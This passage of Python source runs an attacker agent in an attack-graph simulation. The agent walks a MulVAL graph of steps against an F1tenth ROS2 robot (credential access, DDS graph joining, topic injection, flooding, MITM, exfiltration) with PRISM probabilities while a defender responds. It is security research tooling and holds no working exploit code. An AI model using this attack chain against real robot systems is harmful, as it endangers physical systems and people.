    "attackerCanNetAdmin(robot_host)":       0.65,
    "graphDiscovery(bridge)":                0.85,
    "targetNodeSelected(bridge)":            0.90,
    "codeLocationKnown(f1tenth_bridge,bridge)": 0.85,
    "compromisedRosNode(bridge)":              0.60,
}

def build_graph(dot_text: str):
    """Parse a MulVAL .dot file into a structured graph of preds and rules."""
    nodes = {int(i): lab for i, lab in NODE_RE.findall(dot_text)}
    edges = [(int(a), int(b)) for a, b in EDGE_RE.findall(dot_text)]

    rule_nodes = {nid for nid, lab in nodes.items() if is_rule(lab)}

    pred_by_id = {}
    pred_truth = {}
    for nid, lab in nodes.items():
        p = parse_pred(lab)
        if p:
            pred_by_id[nid] = p
            pred_truth[p] = parse_truth(lab)

    pred_nodes = set(pred_by_id.keys())

    preds_of_rule = defaultdict(list)
    succs_of_rule = defaultdict(list)

    for a, b in edges:
        if b in rule_nodes and a in pred_nodes:
            preds_of_rule[b].append(a)
        if a in rule_nodes and b in pred_nodes:
            succs_of_rule[a].append(b)

    # Preserve OR semantics across rules: each predicate has a list of dep options.
    deps_options_by_pred = defaultdict(list)
    for r in rule_nodes:
        pre_preds = [pred_by_id[p] for p in preds_of_rule.get(r, [])]
        suc_preds = [pred_by_id[s] for s in succs_of_rule.get(r, [])]
        for s in suc_preds:
            deps_options_by_pred[s].append(tuple(sorted(set(pre_preds))))

    dep_options = {}
    for pred, opts in deps_options_by_pred.items():
        uniq = []
        seen = set()
        for opt in opts:
            if opt in seen:
                continue
            seen.add(opt)
            uniq.append(list(opt))
        dep_options[pred] = uniq

    deps_by_pred = {
        pred: sorted(set(p for opt in opts for p in opt))
        for pred, opts in dep_options.items()
    }

    all_preds = sorted(set(pred_by_id.values()))
    actions = sorted(deps_by_pred.keys())
    conditions = [p for p in all_preds if p not in set(actions)]
    graph_true_facts = {p for p, v in pred_truth.items() if v is True}

    return {
        "actions": actions,
        "conditions": conditions,
        "deps": {k: sorted(v) for k, v in deps_by_pred.items()},
        "dep_options": dep_options,
        "graph_true_facts": graph_true_facts,
        "pred_truth": pred_truth,
    }


ATTACK_LABEL_TO_PRED = {
    "L_26_RULE6_Attackergainsinitialaccesstoanentryhost_26": "initialAccess(engineering_ws)",
    "L_23_RULE7_Attackerlaterallyreachesanotherhost_23": "lateralAccess(robot_host)",
    "L_20_RULE8_AttackerobtainsROScredentialsfromreachedhost_20": "credentialAccess(robot_host)",
    "L_29_RULE9_AttackerispositionedonROSnetwork_29": "attackerOnRosNetwork(robot_host)",
    "L_18_RULE10_AttackercanjoinROSgraphasanauthorizedparticipant_18": "attackerCanJoinRosGraph(robot_host)",
    "L_31_RULE11_AttackercanjoinROSgraphwhenDDSsecurityisdisabled_31": "attackerCanJoinRosGraph(robot_host)",
    "L_32_RULE11_AttackercanjoinROSgraphwhenDDSsecurityisdisabled_32": "attackerCanJoinRosGraph(robot_host)",
    "L_37_RULE11_AttackercanjoinROSgraphwhenDDSsecurityisdisabled_37": "attackerCanJoinRosGraph(robot_host)",
    "L_92_RULE12_Attackerhashostprivilegefornetworkshaping_92": "attackerCanNetAdmin(robot_host)",
    "L_71_RULE6_AttackerdiscoversROSnodethroughexposedDDSgraph_71": "graphDiscovery(bridge)",
    "L_85_RULE13_AttackerdiscoversROSnodethroughexposedDDSgraph_85": "graphDiscovery(bridge)",
    "L_68_RULE7_Attackerselectsimpactfultargetnode_68": "targetNodeSelected(bridge)",
    "L_82_RULE14_Attackerselectsimpactfultargetnode_82": "targetNodeSelected(bridge)",
    "L_64_RULE8_Attackerlocatescodeimplementingtargetnode_64": "codeLocationKnown(f1tenth_bridge,bridge)",
    "L_61_RULE9_Attackermodifiestrustednodeimplementation_61": "compromisedRosNode(bridge)",
    "L_12_RULE11_Attackerwritestopic_12": "topicWrite('/drive')",
    "L_12_RULE16_Attackerwritestopic_12": "topicWrite('/drive')",
    "L_35_RULE11_Attackerwritestopic_35": "topicWrite('/scan')",
    "L_60_RULE16_Attackerwritestopic_60": "topicWrite('/scan')",
    "L_52_RULE15_Compromisedtrustedpublishertamperssensortopiccontent_52": "maliciousTopicContent('/scan')",
    "L_73_RULE20_Authorizedrogueparticipanttamperssensortopiccontent_73": "maliciousTopicContent('/scan')",
    "L_76_RULE16_Compromisedtrustedpublisherdropssensortopic_76": "topicDrop('/scan')",
    "L_90_RULE21_Attackerdropssensortopicvianetworkimpairment_90": "topicDrop('/scan')",
    "L_79_RULE17_Compromisedtrustedpublisherdelayssensortopic_79": "topicDelay('/scan')",
    "L_97_RULE22_Attackerdelayssensortopicvianetworkimpairment_97": "topicDelay('/scan')",
    "L_82_RULE18_CompromisedtrustedpublisherdegradessensorQoS_82": "qosDegradation('/scan')",
    "L_100_RULE23_AuthorizedrogueparticipantdegradessensorQoS_100": "qosDegradation('/scan')",
    "L_90_RULE13_Attackercallsservice_90": "serviceCall('/bridge/set_parameters',bridge)",
    "L_108_RULE18_Attackercallsservice_108": "serviceCall('/bridge/set_parameters',bridge)",
    "L_103_RULE13_Attackercallsservice_103": "serviceCall('/map_server/change_state',map_server)",
    "L_121_RULE18_Attackercallsservice_121": "serviceCall('/map_server/change_state',map_server)",
    "L_119_RULE10_Attackerreadstopic_119": "topicRead('/scan')",
    "L_133_RULE15_Attackerreadstopic_133": "topicRead('/scan')",
    "L_134_RULE12_Attackerfloodstopic_134": "topicFlood('/drive')",
    "L_149_RULE17_Attackerfloodstopic_149": "topicFlood('/drive')",
    "L_53_RULE72_Attackergraduallydriftscontrolvaluestowardunsafeenvelope_53": "gradualDrift('/drive')",
    "L_75_RULE71_AttackerrunsMITMinjectionontopic_75":                          "mitmInjection('/scan')",
    "L_89_RULE73_Attackerpublishesstaletimestampedmessages_89":                 "stalePublish('/scan')",
    "L_102_RULE76_AttackeroscillatesQoSreliabilitytodisruptsubscribers_102":    "reliabilityFlip('/scan')",
    "L_118_RULE77_Attackerhijackslifecyclenodewithmaliciousconfig_118":         "lifecycleHijack(map_server)",
    "L_154_RULE74_Attackercorrelatesmultiplesensitivetopics_154":               "crossTopicCorrelation(f1tenth)",
    "L_159_RULE15_Attackerreadstopic_159":                                      "topicRead('/odom')",
}

PRED_TO_ATTACK_LABEL = {v: k for k, v in ATTACK_LABEL_TO_PRED.items()}

PRED_TO_SMG = {
    "initialAccess(engineering_ws)": "initialAccess_engineering_ws_",
    "lateralAccess(robot_host)": "lateralAccess_robot_host_",
    "credentialAccess(robot_host)": "credentialAccess_robot_host_",
    "attackerOnRosNetwork(robot_host)": "attackerOnRosNetwork_robot_host_",
    "attackerCanJoinRosGraph(robot_host)": "attackerCanJoinRosGraph_robot_host_",
    "attackerCanNetAdmin(robot_host)": "attackerCanNetAdmin_robot_host_",
    "graphDiscovery(bridge)": "graphDiscovery_bridge_",
    "targetNodeSelected(bridge)": "targetNodeSelected_bridge_",
    "codeLocationKnown(f1tenth_bridge,bridge)": "codeLocationKnown_f1tenth_bridge_bridge_",
    "compromisedRosNode(bridge)": "compromisedRosNode_bridge_",
    "systemCompromised(f1tenth)": "systemCompromised_f1tenth_",
    "operationalCompromise(f1tenth)": "operationalCompromise_f1tenth_",
    "commandIntegrityLoss('/drive')": "commandIntegrityLoss_drive_",
    "topicInfluence('/drive')": "topicInfluence_drive_",
    "topicWrite('/drive')": "topicWrite_drive_",
    "sensorIntegrityLoss('/scan')": "sensorIntegrityLoss_scan_",
    "topicInfluence('/scan')": "topicInfluence_scan_",
    "maliciousTopicContent('/scan')": "maliciousTopicContent_scan_",
    "nodePublishesToTopic(bridge,'/scan')": "nodePublishesToTopic_bridge_scan_",
    "typeOkPublisher(bridge,'/scan')": "typeOkPublisher_bridge_scan_",
    "sensorAvailabilityLoss('/scan')": "sensorAvailabilityLoss_scan_",
    "topicDrop('/scan')": "topicDrop_scan_",
    "topicDelay('/scan')": "topicDelay_scan_",
    "qosDegradation('/scan')": "qosDegradation_scan_",
    "configurationIntegrityLoss(bridge)": "configurationIntegrityLoss_bridge_",
    "parameterTamper(bridge)": "parameterTamper_bridge_",
    "serviceCall('/bridge/set_parameters',bridge)": "serviceCall_bridgeset_parameters_bridge_",
    "rosService('/bridge/set_parameters',bridge)": "rosService_bridgeset_parameters_bridge_",
    "lifecycleDisruption(map_server)": "lifecycleDisruption_map_server_",
    "lifecycleAbuse(map_server)": "lifecycleAbuse_map_server_",
    "serviceCall('/map_server/change_state',map_server)": "serviceCall_map_serverchange_state_map_server_",
    "rtpsReachableNode(map_server)": "rtpsReachableNode_map_server_",
    "rosService('/map_server/change_state',map_server)": "rosService_map_serverchange_state_map_server_",
    "confidentialityCompromise(f1tenth)": "confidentialityCompromise_f1tenth_",
    "exfiltrateTopicData('/scan')": "exfiltrateTopicData_scan_",
    "topicRead('/scan')": "topicRead_scan_",
    "cryptoInfoLeak('/scan')": "cryptoInfoLeak_scan_",
    "mitmPossible('/scan')": "mitmPossible_scan_",
    "topicWrite('/scan')": "topicWrite_scan_",
    "rtpsReachableNode(rviz)": "rtpsReachableNode_rviz_",
    "nodeSubscribesToTopic(rviz,'/scan')": "nodeSubscribesToTopic_rviz_scan_",
    "typeOkSubscriber(rviz,'/scan')": "typeOkSubscriber_rviz_scan_",
    "availabilityCompromise(f1tenth)": "availabilityCompromise_f1tenth_",
    "dos(bridge)": "dos_bridge_",
    "topicFlood('/drive')": "topicFlood_drive_",
    "rtpsReachableNode(bridge)": "rtpsReachableNode_bridge_",
    "nodeSubscribesToTopic(bridge,'/drive')": "nodeSubscribesToTopic_bridge_drive_",
    "typeOkSubscriber(bridge,'/drive')": "typeOkSubscriber_bridge_drive_",
}

def _distances_to_goal(graph, goal):
    """BFS backward through dep graph; returns {predicate: hops_to_goal}."""
    dist = {goal: 0}
    queue = [goal]
    while queue:
        next_queue = []
        for p in queue:
            d = dist[p]
            for option in graph.get("dep_options", {}).get(p, []):
                for dep in option:
                    if dep not in dist:
                        dist[dep] = d + 1
                        next_queue.append(dep)
            for dep in graph.get("deps", {}).get(p, []):
                if dep not in dist:
                    dist[dep] = d + 1
                    next_queue.append(dep)
        queue = next_queue
    return dist


def initialize_graph_facts(graph, state):
    """Seed state with the always-true graph facts and default turn."""
    state = normalize_state(state)
    changed = False

    for pred in graph.get("graph_true_facts", set()):
        if not fact_true(state, pred):
            state["facts"][pred] = True
            state["meta"][f"why::{pred}"] = "graph_true_fact"
            smg_key = PRED_TO_SMG.get(pred)
            if smg_key:
                state["smg"][smg_key] = True
            changed = True

    if "t" not in state["smg"]:
        state["smg"]["t"] = 1
        changed = True

    if changed:
        save_state(state)

    return load_state()


def propagate_derived(graph, state, max_derivations=0):
    """Fire chain derivation rules (max_derivations=0 = unlimited)."""
    state = normalize_state(state)
    try:
        fresh = load_state()
        state["meta"]["blocked_predicates"] = (
            fresh.get("meta", {}).get("blocked_predicates", {})
        )
    except Exception:
        pass
    derivations = 0
    changed = True

    while changed:
        if max_derivations > 0 and derivations >= max_derivations:
            break
        changed = False
        for pred in sorted(graph["actions"]):
            if pred not in DERIVABLE_PREDS:
                continue
            if achieved(state, pred):
                continue

            dep_options = graph.get("dep_options", {}).get(pred, [])
            if not dep_options:
                dep_options = [graph["deps"].get(pred, [])]

            if any(all(achieved(state, d) for d in option) for option in dep_options):
                if _is_blocked(state, pred):
                    print(f"[ATTACKER] BLOCKED: chain derivation of {pred} "
                          f"skipped — defender has active block on it")
                    continue
                state["predicates"][pred] = True
                state["meta"][f"why::{pred}"] = "derived_from_graph"
                smg_key = PRED_TO_SMG.get(pred)
                if smg_key:
                    state["smg"][smg_key] = True
                changed = True
                derivations += 1
                if max_derivations > 0 and derivations >= max_derivations:
                    break

        if changed:
            save_state(state)
            state = load_state()

    return state


def attacker_enabled_actions(graph, state):
    """List executable attack actions whose dependency option is satisfied."""
    enabled = []

    for a in sorted(graph["actions"]):
        if a not in EXECUTABLE_ATTACK_ACTIONS:
            continue
        if achieved(state, a):
            continue

        dep_options = graph.get("dep_options", {}).get(a, [])
        if not dep_options:
            dep_options = [graph["deps"].get(a, [])]

        if any(all(achieved(state, d) for d in option) for option in dep_options):
            enabled.append(a)

    return enabled


def _true_preds_for_diff(state):
    """Return the set of all currently-true facts and predicates."""
    state = normalize_state(state)
    out = set()
    for k, v in state["facts"].items():
        if v:
            out.add(k)
    for k, v in state["predicates"].items():
        if v:
            out.add(k)
    return out


def explain_progress(graph, before_state, after_state, executed_pred):
    """Print which new predicates became true and the rule chain that derived them."""
    before_true = _true_preds_for_diff(before_state)
    after_true = _true_preds_for_diff(after_state)
    new_preds = sorted(p for p in (after_true - before_true))

    if not new_preds:
        return

    print("\n[EXPLAIN] New progress this step:")
    print(f"  - {executed_pred} (executed action)")
    chain_order = [executed_pred]

    dep_options = graph.get("dep_options", {})
    known = {executed_pred}
    remaining = [p for p in new_preds if p != executed_pred]

    while remaining:
        progressed = False
        for p in list(remaining):
            options = dep_options.get(p)
            if not options:
                options = [graph.get("deps", {}).get(p, [])]

            picked = None
            for opt in options:
                if all(d in after_true for d in opt) and any(d in known for d in opt):
                    picked = opt
                    break

            if picked is None:
                continue

            deps_text = ", ".join(picked) if picked else "(no prerequisites)"
            print(f"  - {p} <= {deps_text}")
            known.add(p)
            chain_order.append(p)
            remaining.remove(p)
            progressed = True

        if not progressed:
            for p in remaining:
                print(f"  - {p}")
                chain_order.append(p)
            break

    if "systemCompromised(f1tenth)" in new_preds:
        print("  - systemCompromised(f1tenth): goal reached from the chain above")
        compressed = []
        for p in chain_order:
            if not compressed or compressed[-1] != p:
                compressed.append(p)
        print("\n[EXPLAIN_SUMMARY] " + " -> ".join(compressed))
        print("[EXPLAIN_SUMMARY] Therefore: this step's action led through the intermediate states to system compromise.")


class AttackerAgent:
    def take_turn(self, graph, state, show_achieved):
        """Execute one attacker step: either chain derivation or an action attempt."""
        # ONE step = one chain derivation OR one action attempt.
        state = initialize_graph_facts(graph, state)

        before = set(k for k, v in load_state().get("predicates", {}).items() if v)
        state = propagate_derived(graph, state, max_derivations=1)
        after = set(k for k, v in load_state().get("predicates", {}).items() if v)
        new_chain = sorted(after - before)
        if new_chain:
            derived = new_chain[0]
            prism_label = PRED_TO_ATTACK_LABEL.get(derived, "CHAIN_DERIVATION")
            os.environ["ATTACK_INTENSITY"] = "chain"
            print(f"[ATTACKER] Chain derivation : {derived}")
            print(f"[ATTACKER] PRISM label      : {prism_label}")
            _combined_log("ATTACKER", f"chain derivation: {derived} (no subprocess)")
            state = load_state()
            set_turn(state, 2)
            state = load_state()
            _signal_step_done()
            show_achieved(state)
            return derived, prism_label, state, True

        enabled = attacker_enabled_actions(graph, state)
        if not enabled:
            print("[ATTACKER] No enabled executable attack actions.")
            state = load_state()
            show_achieved(state)
            return None, None, state, False

        policy = os.environ.get("ATTACKER_POLICY", "random").strip().lower()
        if policy == "random":
            import random
            ordered = enabled[:]
            random.shuffle(ordered)
        elif policy == "goal_directed":
            # Order enabled actions by graph-distance to systemCompromised; tie-break random.
            import random
            dist = _distances_to_goal(graph, "systemCompromised(f1tenth)")
            enabled_with_dist = [(p, dist.get(p, 10**6)) for p in enabled]
            random.shuffle(enabled_with_dist)
            enabled_with_dist.sort(key=lambda x: x[1])
            ordered = [p for p, _ in enabled_with_dist]
        else:
            ordered = enabled

        print(f"[ATTACKER] policy={policy} enabled={enabled}")

        pred = None
        for candidate in ordered:
            if ACTION_IMPL.get(candidate) is not None:
                pred = candidate
                break
        if pred is None:
            print("[ATTACKER] No enabled action has a runtime implementation.")
            state = load_state()
            show_achieved(state)
            return None, None, state, False

        prism_label = PRED_TO_ATTACK_LABEL.get(pred, "UNMAPPED")
        print("[ATTACKER] Chosen attack action:", pred)
        print("[ATTACKER] Equivalent PRISM label:", prism_label)

        import random as _random
        prism_prob = ACT_PRISM_PROB.get(pred, 0.7)
        if prism_prob >= 1.0:
            outcome = "success"
            dice = -1.0
            print(f"[ATTACKER] p={prism_prob:.2f} -> deterministic SUCCESS (no dice)")
            _combined_log("ATTACKER", f"fired {pred}  p=1.00 (deterministic, no dice)")
        else:
            prob_fail = 1.0 - prism_prob
            # 90% of failure mass is RETRY, 10% is GIVE_UP.
            thr_retry = prism_prob + prob_fail * (9.0 / 10.0)
            dice = _random.random()
            if dice < prism_prob:
                outcome = "success"
            elif dice < thr_retry:
                outcome = "retry"
            else:
                outcome = "give_up"
            print(f"[ATTACKER] dice={dice:.3f} p={prism_prob:.2f} -> {outcome.upper()}")
            _combined_log("ATTACKER",
                          f"fired {pred}  dice={dice:.3f} p={prism_prob:.2f} -> {outcome.upper()}")

        os.environ["ATTACK_INTENSITY"] = outcome

        pre_action_state = load_state()
        fn = ACTION_IMPL[pred]
        ok = fn()
        os.environ["ATTACK_SUBPROCESS_OK"] = "1" if ok else "0"
        _signal_step_done()

        # Dice is source of truth; subprocess ok is informational only.
        attack_succeeded = (outcome == "success")
        os.environ["ATTACK_SUCCEEDED_BOOL"] = "1" if attack_succeeded else "0"
        print(f"[ATTACKER] subprocess ok={ok}  attack_succeeded={attack_succeeded}"
              f" (model says: {'SUCCESS' if attack_succeeded else outcome.upper()})")
        _combined_log("ATTACKER",
                      f"subprocess ok={ok}; predicate {'MARKED' if attack_succeeded else 'not marked'}")

        if attack_succeeded:
            state = load_state()
            mark_pred(state, pred, why=f"action_executed (dice={dice:.3f}<{prism_prob:.2f}, ok={ok})")
            smg_key = PRED_TO_SMG.get(pred)
            if smg_key:
                set_smg(state, smg_key, True)
            set_turn(state, 2)

        if outcome == "give_up":
            state = load_state()
            state.setdefault("meta", {})
            state["meta"]["attacker_gave_up"] = (
                f"{pred}@{_random.random():.0f}|dice={dice:.3f}|p={prism_prob:.2f}"
            )
            save_state(state)
            print(f"[ATTACKER] PRISM give-up branch (t'=3); game ends, defender wins")
            show_achieved(state)
            return pred, prism_label, state, True

        if attack_succeeded:
            state = load_state()
            print("[ATTACKER] result: True")
            explain_progress(graph, pre_action_state, state, pred)
            show_achieved(state)
        else:
            state = load_state()
            print(f"[ATTACKER] result: False (retry — attacker keeps turn)")
            show_achieved(state)

        return pred, prism_label, state, True


if __name__ == "__main__":
    import sys

    DOT_DEFAULT = "AttackGraph.dot"
    MAX_STEPS = int(os.environ.get("MAX_STEPS", "100000"))

    def show_achieved(state):
        """Print a summary of facts, predicates, and SMG keys from state."""
        state = normalize_state(state)
        if ATTACKER_OUTPUT in {"full", "verbose", "1"}:
            print("\n[STATE] facts:")
            for k in sorted([k for k, v in state["facts"].items() if v]):
                print("  [FACT]", k)

            print("\n[STATE] achieved predicates:")
            for k in sorted([k for k, v in state["predicates"].items() if v]):
                print("  [PRED]", k)

            print("\n[STATE] smg:")
            for k in sorted(state["smg"].keys()):
                print(f"  [SMG] {k} = {state['smg'][k]}")
            return

        true_preds = sorted([k for k, v in state["predicates"].items() if v])
        key_preds = [
            "initialAccess(engineering_ws)",
            "lateralAccess(robot_host)",
            "credentialAccess(robot_host)",
            "attackerOnRosNetwork(robot_host)",
            "attackerCanJoinRosGraph(robot_host)",
            "attackerCanNetAdmin(robot_host)",
            "graphDiscovery(bridge)",
            "targetNodeSelected(bridge)",
            "topicWrite('/drive')",
            "topicWrite('/scan')",
            "topicRead('/scan')",
            "topicRead('/odom')",
            "topicFlood('/drive')",
            "maliciousTopicContent('/scan')",
            "qosDegradation('/scan')",
            "topicDrop('/scan')",
            "topicDelay('/scan')",
            "mitmInjection('/scan')",
            "gradualDrift('/drive')",
            "stalePublish('/scan')",
            "reliabilityFlip('/scan')",
            "lifecycleHijack(map_server)",
            "crossTopicCorrelation(f1tenth)",
            "serviceCall('/bridge/set_parameters',bridge)",
            "serviceCall('/map_server/change_state',map_server)",
            "serviceCall('/map_server/set_parameters',map_server)",
            "mitmPossible('/scan')",
            "parameterTamper(map_server)",
            "lifecycleAbuse(map_server)",
            "lifecycleDisruption(map_server)",
            "exfiltrateChannel('/attacker_exfil')",
            "drive_DoS(f1tenth)",
            "command_unsafe(f1tenth)",
            "scan_corrupted(f1tenth)",
            "scan_unreliable(f1tenth)",
            "map_server_down(f1tenth)",
            "bridge_misconfigured(f1tenth)",
            "data_leaked(f1tenth)",
            "systemCompromised(f1tenth)",
        ]
        achieved_keys = [p for p in key_preds if p in true_preds]
        print("\n[STATE_SUMMARY] key predicates:")
        for p in achieved_keys:
            print("  -", p)

    attack_dot_path = sys.argv[1] if len(sys.argv) >= 2 else DOT_DEFAULT

    if not os.path.exists(attack_dot_path):
        raise FileNotFoundError(f"Attack graph file not found: {attack_dot_path}")

    with open(attack_dot_path, "r", errors="ignore") as f:
        attack_dot = f.read()

    graph = build_graph(attack_dot)

    state = load_state()
    save_state(state)

    # Settle structural derivations BEFORE the step loop so they don't count as steps.
    state = initialize_graph_facts(graph, state)
    state = propagate_derived(graph, state, max_derivations=0)
    print("[INIT] structural derivations settled before step loop")

    attacker = AttackerAgent()

    turn_timeout = float(os.environ.get("TURN_TIMEOUT_SEC", "10.0"))
    wait_between = float(os.environ.get("WAIT_BETWEEN_STEPS", "10.0"))

    def _read_defender_summary(after_ts):
        """Read defender's last-turn summary if newer than after_ts."""
        try:
            with open(DEFENDER_TURN_SUMMARY_PATH) as f:
                summary = json.load(f)
            if summary.get("turn_ts", 0) > after_ts:
                return summary
        except (FileNotFoundError, json.JSONDecodeError):
            pass
        return None

    def _print_turn_narrative(step, pred, outcome, attack_succeeded,
                              subprocess_ok, defender_summary):
        """Print the unified TURN N summary block."""
        bar = "═" * 70
        print()
        print(bar)
        print(f"  TURN {step}  SUMMARY")
        print(bar)
        if outcome == "chain":
            print(f"  ATTACKER  derived (no subprocess) -> {pred}")
        else:
            print(f"  ATTACKER  fired  {pred}")
            print(f"            intensity={outcome.upper()}, "
                  f"subprocess_ok={subprocess_ok}, attack_succeeded={attack_succeeded}")
            reason_note = os.environ.get("ATTACK_INTENSITY_NOTE", "").strip()
            if reason_note:
                print(f"            {reason_note}")

        if defender_summary and defender_summary.get("defense"):
            alert = defender_summary.get("alert", "(none)")
            defense = defender_summary.get("defense", "(none)")
            defense_succeeded = defender_summary.get("defense_succeeded", False)
            killed = defender_summary.get("killed", [])
            revoked = defender_summary.get("revoked", [])
            print(f"  MONITOR   detected: {alert}")
            print(f"  DEFENDER  ran {defense}")
            for k in killed:
                desc = k.get("description", "?")
                pid = k.get("pid", "?")
                print(f"              killed pid={pid}  ({desc})")

            if not attack_succeeded and killed:
                print(f"            VERDICT: defense stopped the attack mid-flight; "
                      f"attacker's predicate never marked")
            elif attack_succeeded and revoked:
                print(f"            revoked: {', '.join(revoked)}")
                print(f"            VERDICT: ATTACK NEUTRALIZED — attacker must redo this step")
            elif attack_succeeded and not revoked:
                print(f"            VERDICT: defense ran but could not revoke; "
                      f"attacker keeps progress")
            elif not attack_succeeded and not killed:
                print(f"            VERDICT: defense ran but had nothing to act on; "
                      f"attack also did not succeed (subprocess error)")
        else:
            print(f"  MONITOR   no alert reached defender (cooldown / undetectable / too brief)")
            print(f"  DEFENDER  did not react")
        cur_state = load_state()
        ATTACKER_PROGRESS = {
            "initialAccess(engineering_ws)", "lateralAccess(robot_host)",
            "credentialAccess(robot_host)", "attackerOnRosNetwork(robot_host)",
            "attackerCanJoinRosGraph(robot_host)", "attackerCanNetAdmin(robot_host)",
            "graphDiscovery(bridge)", "targetNodeSelected(bridge)",
            "codeLocationKnown(f1tenth_bridge,bridge)", "compromisedRosNode(bridge)",
            "topicWrite('/drive')", "topicWrite('/scan')",
            "topicRead('/scan')", "topicRead('/odom')",
            "topicFlood('/drive')", "maliciousTopicContent('/scan')",
            "qosDegradation('/scan')", "topicDrop('/scan')",
            "topicDelay('/scan')", "mitmInjection('/scan')",
            "gradualDrift('/drive')", "stalePublish('/scan')",
            "reliabilityFlip('/scan')", "lifecycleHijack(map_server)",
            "crossTopicCorrelation(f1tenth)", "exfiltrateChannel('/attacker_exfil')",
            "serviceCall('/bridge/set_parameters',bridge)",
            "serviceCall('/map_server/change_state',map_server)",
            "serviceCall('/map_server/set_parameters',map_server)",
            "mitmPossible('/scan')", "parameterTamper(map_server)",
            "lifecycleAbuse(map_server)", "lifecycleDisruption(map_server)",
            "drive_DoS(f1tenth)", "command_unsafe(f1tenth)",
            "scan_corrupted(f1tenth)", "scan_unreliable(f1tenth)",
            "map_server_down(f1tenth)", "bridge_misconfigured(f1tenth)",
            "data_leaked(f1tenth)", "systemCompromised(f1tenth)",
        }
        achieved = [k for k, v in cur_state.get("predicates", {}).items()
                    if v and k in ATTACKER_PROGRESS]
        print(f"  STATE     {len(achieved)} attacker-progress predicate(s) true: "
              f"{sorted(achieved)[:6]}{'…' if len(achieved) > 6 else ''}")
        print(bar)

    timeout_reached = True
    for step in range(1, MAX_STEPS + 1):
        print(f"\n========== ATTACK STEP {step} ==========")
        _combined_log("ATTACKER", f"=== STEP {step} begins ===")
        attack_start_ts = time.time()
        for k in ("ATTACK_INTENSITY", "ATTACK_INTENSITY_NOTE",
                  "ATTACK_SUCCEEDED_BOOL", "ATTACK_SUBPROCESS_OK"):
            os.environ.pop(k, None)
        _sync_creds_with_state()
        pred, prism_label, state, ok = attacker.take_turn(graph, load_state(), show_achieved)

        outcome_this_step = os.environ.get("ATTACK_INTENSITY", "?")

        if not ok:
            print("[INFO] No enabled executable attack actions remain.")
            timeout_reached = False
            break

        if achieved(load_state(), "systemCompromised(f1tenth)"):
            print("\n[TERMINAL] Attacker reached systemCompromised(f1tenth)")
            _combined_log("ATTACKER", "TERMINAL: systemCompromised reached, attacker wins")
            timeout_reached = False
            break

        if load_state().get("meta", {}).get("attacker_gave_up"):
            print("\n[TERMINAL] Attacker gave up (PRISM t=3 branch). Defender wins this trial.")
            _combined_log("ATTACKER", "TERMINAL: attacker gave up (PRISM t=3), defender wins")
            timeout_reached = False
            break

        signal = wait_for_defender_turn(attack_start_ts, timeout=turn_timeout)
        defender_summary = _read_defender_summary(attack_start_ts)

        elapsed = time.time() - attack_start_ts
        remaining = wait_between - elapsed
        if remaining > 0:
            time.sleep(remaining)

        attack_succeeded = os.environ.get("ATTACK_SUCCEEDED_BOOL", "0") == "1"
        subprocess_ok = os.environ.get("ATTACK_SUBPROCESS_OK", "0") == "1"
        _print_turn_narrative(step, pred, outcome_this_step,
                              attack_succeeded, subprocess_ok,
                              defender_summary)

    if timeout_reached:
        print(f"\n[TERMINAL] MAX_STEPS={MAX_STEPS} reached without compromise. "
              f"Defender wins this trial (timeout).")
        _combined_log("ATTACKER",
                      f"TERMINAL: MAX_STEPS={MAX_STEPS} reached, defender wins (timeout)")
